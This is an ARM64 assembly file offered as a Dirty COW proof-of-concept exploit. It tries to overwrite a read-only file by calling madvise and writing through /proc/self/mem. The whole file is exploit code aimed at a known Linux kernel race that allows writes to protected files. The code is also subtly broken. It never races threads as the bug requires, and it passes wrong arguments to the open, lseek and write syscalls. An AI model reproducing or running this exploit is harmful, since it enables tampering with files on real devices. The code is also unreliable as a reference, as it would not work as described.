/*
 * dirty_cow_user_exploit.s - Dirty COW Exploit POC.
 *
 * This exploit maps a read-only file (set as "/data/local/tmp/immutable_file"),
 * calls madvise() (with MADV_DONTNEED) to trigger the Dirty COW race,
 * and then writes to /proc/self/mem to overwrite the file.
 *
 * WARNING: This actively writes to the file. Run only in your isolated environment.
 */
 
.section .data
filename:
    .asciz "/data/local/tmp/immutable_file\0"  // Prepare this file (set as read-only) in your test setup.
newdata:
    .asciz "Hacked by Dirty COW!\n"

.section .text
.global main
main:
    /* Open the target file in read-only mode */
    adr x0, filename
    mov x1, #0        // O_RDONLY
    mov x8, #56       // open syscall
    svc 0
    mov x19, x0       // Save file descriptor

    /* Map the file into memory (read-only mapping) */
    mov x0, 0
    mov x1, #1024
    mov x2, #1      // PROT_READ
    mov x3, #2      // MAP_PRIVATE
    mov x4, x19
    mov x5, 0
    mov x8, #222    // mmap syscall
    svc 0
    mov x20, x0    // Save mapped memory pointer

    /* Issue madvise (MADV_DONTNEED = 4) */
    mov x0, x20
    mov x1, #1024
    mov x2, #4
    mov x8, #233   // madvise syscall
    svc 0

    /* Open /proc/self/mem */
    adr x0, proc_mem
    mov x1, #2      // O_RDWR
    mov x8, #56
    svc 0
    mov x21, x0   // Save /proc/self/mem FD

    /* Seek to the mapped address in /proc/self/mem */
    mov x0, x21
    mov x1, x20   // Target address
    mov x8, #62   // lseek syscall
    svc 0

    /* Write newdata into /proc/self/mem */
    adr x0, newdata
    mov x1, #24   // Length of newdata
    mov x8, #64   // write syscall
    svc 0

    /* Cleanup: close FDs and unmap memory */
    mov x0, x19
    mov x8, #57
    svc 0
    mov x0, x21
    mov x8, #57
    svc 0
    mov x0, x20
    mov x1, #1024
    mov x8, #215  // munmap syscall
    svc 0

    /* Exit */
    mov x0, #0
    mov x8, #93
    svc 0

.section .data
proc_mem:
    .asciz "/proc/self/mem\0"
